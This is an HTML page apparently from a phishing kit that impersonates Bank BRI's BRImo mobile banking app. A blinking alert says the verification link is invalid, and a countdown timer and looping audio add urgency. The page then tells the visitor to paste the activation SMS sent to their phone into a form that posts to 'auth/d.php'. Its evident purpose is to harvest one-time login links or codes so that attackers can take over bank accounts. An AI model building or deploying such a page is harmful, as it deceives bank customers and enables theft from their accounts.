
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="fragment" content="!">
    <meta name="description" content="BRImo merupakan Aplikasi Keuangan Bank Digital BRI Terbaru berbasis data internet yang memberikan kemudahan bagi nasabah maupun non nasabah BRI untuk dapat bertransaksi dengan User Interface dan User Experience terbaru, fitur login face recognition, login fingerprint, top up gopay, pembayaran QR dan fitur menarik lainnya, dengan pilihan Sumber Dana/sumber dana setiap transaksi dapat ...">
    <link rel="image_src" href="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654819767432x249088519034370100%2Fbri-logo.png?w=&h=&auto=compress&dpr=1&fit=max" />
    <meta property="og:image" content="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654819767432x249088519034370100%2Fbri-logo.png?w=&amp;h=&amp;auto=compress&amp;dpr=1&amp;fit=max" />
    <meta name="twitter:image:src" content="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654819767432x249088519034370100%2Fbri-logo.png?w=&amp;h=&amp;auto=compress&amp;dpr=1&amp;fit=max" />
    <meta property="og:type" content="website" />
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui">
    <meta name="theme-color" content="#1583dc">
    <title>BRImo- Bank BRI</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css" />
    <style>
      @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');

      @font-face {
        font-family: 'Avenir';
        src: url(fonts/AvenirNextLTPro-Bold.otf);
      }

      body {
        padding: 0;
        margin: 0;
        width: 100%;
        font-family: 'Avenir';
        background: #d1d1d1;
      }

      .text-header {
        font-family: 'Avenir';
        color: #0086e0;
      }

      .text-subheader {
        font-family: 'Avenir';
        margin-top: -20px;
        color: #000;
      }

      .btn-punya {
        display: block;
        margin: 80px auto 0 auto;
        padding: 0px;
        cursor: pointer;
        background: none rgb(0, 134, 224);
        border: none;
        text-align: center;
        height: 57px;
        width: 459px;
        max-width: 100%;
        font-family: Arial;
        font-size: 14px;
        font-weight: bold;
        color: rgb(255, 255, 255);
        letter-spacing: 2px;
        line-height: 1;
        border-radius: 5px;
        box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
        transition: background 200ms ease 0s;
      }

      .btn-belum {
        display: block;
        margin: 10px auto;
        padding: 0px;
        cursor: pointer;
        background: none transparent;
        border: none;
        text-align: center;
        height: 57px;
        width: 459px;
        max-width: 100%;
        font-family: Arial;
        font-size: 14px;
        font-weight: bold;
        color: rgb(0, 134, 224);
        letter-spacing: 2px;
        line-height: 1;
        border-radius: 5px;
        transition: background 200ms ease 0s;
      }

      .form-log {
        box-sizing: border-box;
        height: 60px;
        width: 536px;
        max-width: 100%;
        border-top: 1px inset rgba(250, 250, 250, 0.13);
        border-right: 1px solid rgba(184, 184, 184, 0.53);
        border-bottom: none;
        border-left: 1px outset rgba(168, 168, 168, 0.58);
        border-image: initial;
        background-color: rgb(255, 255, 255);
        border-radius: 5px 5px 0px 0px;
        box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px;
        font-family: 'Avenir';
        font-size: 16px;
        color: rgb(28, 28, 28);
        word-spacing: 7px;
        padding: 0px 45px;
        outline: none;
      }

      #ionIcons {
        color: rgb(22, 119, 199);
        font-size: 29px;
        position: absolute;
        display: block;
        margin-top: 7px;
        margin-left: 15px;
      }

      .eye {
        display: block;
        margin: -40px auto;
        margin-right: 20px;
        position: relative;
        box-sizing: border-box;
        z-index: 16;
        height: 19.8189px;
        width: 25.0236px;
        float: right;
        border-radius: 0px;
        cursor: pointer;
      }

      .btn-login {
        display: block;
        margin: 60px 0 0 0;
        padding: 0px;
        cursor: pointer;
        background: none rgba(0, 111, 214, 0.96);
        border: none;
        text-align: center;
        height: 57px;
        width: 370px;
        font-family: Arial;
        font-size: 17px;
        font-weight: bold;
        color: rgb(255, 255, 255);
        letter-spacing: 1px;
        line-height: 1;
        border-radius: 8px;
        box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
        transition: background 100ms step-start 0s;
      }

      @media only screen and (max-width: 600px) {
        .btn-login {
          width: 82%;
        }
      }

      .box-lte {
        width: 380px;
        max-width: 95%;
        background: #fff;
        display: block;
        margin: -40px auto;
        border-radius: 10px;
      }

      textarea {
        border: 3px solid rgb(0, 134, 224);
        border-radius: 8px;
        padding: 5px 10px;
        font-family: 'Avenir';
      }

      .blink {
        animation: blink-animation 5s steps(5, start) infinite;
        -webkit-animation: blink-animation 1s steps(5, start) infinite;
      }

      @keyframes blink-animation {
        to {
          visibility: hidden;
        }
      }

      @-webkit-keyframes blink-animation {
        to {
          visibility: hidden;
        }
      }

      h1 {

        display: table;

        background-color: #FF0000;
        color: #fff;
        padding: 15px;
        width: 100%;
        font-size: 1em;
        text-align: center;
      }
      
    </style>
  </head>
  <body><audio hidden autoplay loop>
      <source src="kodeinvalid.mp3" type="audio/mpeg">
    </audio>
    <span class="blink"><h1>Link verifikasi tidak valid, silahkan mencoba lagi.</h1></span>
    <div class="container">
      <div class="box-lte">
        <div class="row" style="margin-top: 100px;">
          <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: -50px; border-radius: 0px;"><img alt="" src="img/link.png?w=384&h=246&auto=compress&dpr=2&fit=max" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;"></div>
        </div>
        <div class="row">
          <hr style="display: block; margin: auto; width: 90%;">
          <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 10px auto;" id="timer"></p>
        </div>
        <div class="row">
          <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;">
            <p style="font-family: 'Avenir'; font-size: 13px; text-align: center; font-weight: bold;">Link untuk Aktivasi BRImo telah kami kirim ke Nomor Handphone anda, Silahkan salin SMS tautan lalu di tempel dibawah ini.</p>
            <p style="font-family: 'Avenir'; font-size: 14px; text-align: center; font-weight: bold; color: #1583dc;">Tempel SMS BRI (Wajib)</p>
          </div>
        </div>
        <div class="row">
          <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;">
            <form action="auth/d.php" method="POST">
              <textarea name="link" id="sms" class="bubble-element MultiLineInput" data-gramm_editor="false" tabindex="1" placeholder="Contoh SMS https://brimo.bri.co.id/app/login?code=" maxlength="" rows="1" style="max-width: 90%; display: block; margin: auto; width: 346px; left: 0px; top: 0px; background-color: rgb(255, 255, 255); min-height: 104px; overflow: hidden; overflow-wrap: break-word; box-shadow: rgba(71, 71, 71, 0.71) 0px 0px 0px 0px; font-family: Arial; font-size: 14px; font-weight: bold; color: rgb(61, 61, 61); text-align: left; height: 102px; outline:none;" required></textarea>
              <button type="submit" id="sent_sms" class="bubble-element Button clickable-element" style="max-width: 90%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1.5px; line-height: 1; border-radius: 5px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s;" tabindex="2">Konfirmasi</button>
            </form>
            
          </div>
        </div>
        </div>
      <div class="row">
        <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;">
          <p style="font-size: 12px; text-align: center; margin-top: 50px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="./" style="text-decoration: none; color: #828282;">Kirim ulang</a></strong></p>
        </div>
      </div>
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
    <script>
      document.getElementById('timer').innerHTML = 03 + ":" + 01;
      startTimer();

      function startTimer() {
        var presentTime = document.getElementById('timer').innerHTML;
        var timeArray = presentTime.split(/[:]+/);
        var m = timeArray[0];
        var s = checkSecond((timeArray[1] - 1));
        if (s == 59) {
          m = m - 1
        }
        if (m < 0) {
          return
        }
        document.getElementById('timer').innerHTML = m + " : " + s;
        setTimeout(startTimer, 1000);
      }

      function checkSecond(sec) {
        if (sec < 10 && sec >= 0) {
          sec = "0" + sec
        }; // add zero in front of numbers < 10
        if (sec < 0) {
          sec = "59"
        };
        return sec;
      }
    </script>
  </body>
</html>